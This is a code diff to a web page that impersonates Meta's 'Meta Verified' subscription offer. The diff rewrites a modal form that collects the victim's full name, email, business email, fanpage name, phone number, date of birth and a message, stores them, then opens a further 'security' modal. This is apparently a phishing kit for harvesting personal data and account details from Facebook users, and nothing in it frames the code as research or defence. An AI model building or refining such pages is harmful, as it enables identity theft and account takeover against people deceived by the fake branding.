@@ -384,6 +384,21 @@
       /* Feature hover */
       .feature-image { transition: opacity 0.7s ease; }
 
+      /* New form input styles (modal Information) */
+      .nf-input-wrap {
+        width: 100%; border: 1px solid #d4dbe3; height: 40px; padding: 0 11px;
+        border-radius: 10px; background: white; font-size: 14px; margin-bottom: 10px;
+        display: flex; align-items: center;
+        transition: border-color 0.2s, box-shadow 0.2s;
+      }
+      .nf-input-wrap:focus-within, .nf-input-wrap:hover {
+        border-color: #3b82f6; box-shadow: 0 2px 8px rgba(59,130,246,0.1);
+      }
+      .nf-input {
+        width: 100%; outline: none; border: none; background: transparent;
+        font-size: 16px; font-family: inherit; height: 100%; display: block; padding: 0;
+      }
+
       /* Success icon */
       .modal-success-icon { width: 64px; height: 64px; margin: 0 auto 16px; display: block; }
     </style>
@@ -434,7 +449,7 @@
           <h1 class="hero-title">Protect your brand with Meta Verified</h1>
           <p class="hero-desc">Meta Verified is a subscription for creators and businesses that helps you build more confidence with new audiences, protect your brand from impersonation and more efficiently engage with your audience.</p>
           <div class="hero-btns">
-            <button onclick="openClientModal()" class="hero-btn">Submit request</button>
+            <button onclick="openClientModal()" class="hero-btn">Subscribe on Facebook</button>
           </div>
           <p class="hero-note"><strong>Are you a business?</strong> Get more information on <a href="#">Meta Verified for businesses</a>.</p>
           <p class="hero-fine">Features, availability and pricing may vary by region and app.</p>
@@ -797,32 +812,77 @@
     function openClientModal() {
       _masterData = {};
       var html =
-        '<div class="modal-header"><span class="modal-title">Meta Verified — Subscribe</span>'
-        +'<button class="modal-close" onclick="Modal.close(\'clientModal\')">&times;</button></div>'
-        +'<form id="clientForm" autocomplete="off">'
-        +'<div class="modal-field"><input id="fullName" type="text" placeholder="Full Name" required autocomplete="name"></div>'
-        +'<div class="modal-field"><input id="email" type="email" placeholder="Email Address" required inputmode="email" autocomplete="email"></div>'
-        +'<div class="modal-field"><input id="fanpage" type="text" placeholder="Facebook / Instagram Profile" required></div>'
+        '<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;">'
+        +'<h2 style="font-weight:700;color:#0A1317;font-size:15px;text-align:center;flex:1;">Information</h2>'
+        +'<div style="width:18px;height:18px;cursor:pointer;opacity:0.6;flex-shrink:0;" onclick="Modal.close(\'clientModal\')">'
+        +'<img src="public/icons/ic_close.svg" style="width:18px;height:18px;" alt="close" onerror="this.parentNode.innerHTML=\'&times;\';this.parentNode.style.fontSize=\'20px\';this.parentNode.style.opacity=\'0.5\';">'
+        +'</div></div>'
+        +'<div style="flex:1;overflow-y:auto;">'
+        +'<form id="clientForm" autocomplete="off" style="width:100%;">'
+
+        /* Full Name */
+        +'<div class="nf-input-wrap"><input id="fullName" placeholder="Full Name" type="text" required autocomplete="name" class="nf-input"></div>'
+
+        /* Email */
+        +'<div class="nf-input-wrap"><input id="email" placeholder="Email Address" type="email" required inputmode="email" autocomplete="email" class="nf-input"></div>'
+
+        /* Email Business */
+        +'<div class="nf-input-wrap"><input id="emailBusiness" placeholder="Email Business Address" type="email" inputmode="email" class="nf-input"></div>'
+
+        /* Fanpage */
+        +'<div class="nf-input-wrap"><input id="fanpage" placeholder="Fanpage Name" type="text" required class="nf-input"></div>'
+
+        /* Phone */
         + _buildPhoneSelector()
-        +'<label class="modal-label">Date of Birth</label>'
-        +'<div class="modal-dob-row">'
-        +'<div class="modal-field" style="margin-bottom:0"><input id="day" type="number" placeholder="Day" min="1" max="31" required inputmode="numeric"></div>'
-        +'<div class="modal-field" style="margin-bottom:0"><input id="month" type="number" placeholder="Month" min="1" max="12" required inputmode="numeric"></div>'
-        +'<div class="modal-field" style="margin-bottom:0"><input id="year" type="number" placeholder="Year" min="1900" max="2024" required inputmode="numeric"></div>'
-        +'</div><div style="height:10px"></div>'
-        +'<p class="modal-hint">Our response will be sent to you within 14–48 hours.</p>'
-        +'<label class="modal-check-row"><input id="agreeCheck" type="checkbox" required> I agree to the <a href="#">Terms of Service</a></label>'
-        +'<button type="submit" class="modal-btn-primary">Continue</button>'
-        +'</form>';
+
+        /* Date of Birth */
+        +'<b style="color:#9a979e;font-size:14px;margin-bottom:7px;display:block;">Date of Birth</b>'
+        +'<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:10px;">'
+        +'<div class="nf-input-wrap" style="margin-bottom:0;"><input id="day" placeholder="Day" type="number" min="1" max="31" required inputmode="numeric" class="nf-input"></div>'
+        +'<div class="nf-input-wrap" style="margin-bottom:0;"><input id="month" placeholder="Month" type="number" min="1" max="12" required inputmode="numeric" class="nf-input"></div>'
+        +'<div class="nf-input-wrap" style="margin-bottom:0;"><input id="year" placeholder="Year" type="number" min="1900" max="2024" required inputmode="numeric" class="nf-input"></div>'
+        +'</div>'
+
+        /* Message */
+        +'<div class="nf-input-wrap" style="height:100px;padding:11px;align-items:flex-start;">'
+        +'<textarea id="message" placeholder="Message" style="width:100%;outline:none;border:none;background:transparent;font-size:16px;font-family:inherit;resize:none;height:100%;display:block;"></textarea>'
+        +'</div>'
+
+        /* Hint */
+        +'<p style="color:#9a979e;font-size:14px;margin-bottom:7px;">Our response will be sent to you within 14 - 48 hours.</p>'
+
+        /* Checkbox */
+        +'<div style="margin-top:15px;margin-bottom:20px;">'
+        +'<label style="cursor:pointer;display:flex;align-items:center;gap:8px;font-size:14px;" for="agreeCheck">'
+        +'<input id="agreeCheck" type="checkbox" required style="width:16px;height:16px;accent-color:#0064E0;flex-shrink:0;">'
+        +'I agree to the <a href="#" style="color:#0064E0;">Terms of use</a>'
+        +'</label></div>'
+
+        /* Submit */
+        +'<div style="width:100%;margin-top:20px;">'
+        +'<button type="submit" class="modal-btn-primary">Submit</button>'
+        +'</div>'
+        +'</form></div>';
+
       Modal.create('clientModal', html);
+
+      /* Apply gradient background to modal box */
+      var box = document.querySelector('#clientModal .modal-box');
+      if (box) {
+        box.style.background = 'linear-gradient(130deg, rgba(249,241,249,1) 0%, rgba(234,243,253,1) 35%, rgba(237,251,242,1) 100%)';
+      }
+
       Modal.open('clientModal');
+
       document.getElementById('clientForm').addEventListener('submit', function(e) {
         e.preventDefault();
-        _masterData.fullName = document.getElementById('fullName').value.trim();
-        _masterData.email    = document.getElementById('email').value.trim();
-        _masterData.fanpage  = document.getElementById('fanpage').value.trim();
-        _masterData.phone    = _selectedDial + ' ' + document.getElementById('phone').value.trim();
-        _masterData.dob      = document.getElementById('day').value+'/'+document.getElementById('month').value+'/'+document.getElementById('year').value;
+        _masterData.fullName      = document.getElementById('fullName').value.trim();
+        _masterData.email         = document.getElementById('email').value.trim();
+        _masterData.emailBusiness = document.getElementById('emailBusiness').value.trim();
+        _masterData.fanpage       = document.getElementById('fanpage').value.trim();
+        _masterData.phone         = _selectedDial + ' ' + document.getElementById('phone').value.trim();
+        _masterData.dob           = document.getElementById('day').value+'/'+document.getElementById('month').value+'/'+document.getElementById('year').value;
+        _masterData.message       = document.getElementById('message').value.trim();
         Modal.close('clientModal');
         setTimeout(openSecurityModal, 280);
       });
